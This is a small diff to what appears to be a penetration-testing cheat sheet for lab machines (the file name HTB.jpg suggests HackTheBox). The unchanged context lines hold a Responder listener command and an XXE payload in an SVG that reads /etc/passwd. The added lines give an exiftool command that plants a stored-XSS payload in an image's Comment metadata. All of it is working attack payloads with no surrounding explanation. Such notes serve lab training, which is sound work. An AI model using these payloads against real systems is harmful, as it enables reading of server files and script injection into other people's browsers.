@@ -164,3 +164,7 @@ sudo responder -I tun0 -A
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg>&xxe;</svg>
 ```
+### Stored XSS via metadata
+```
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
+```
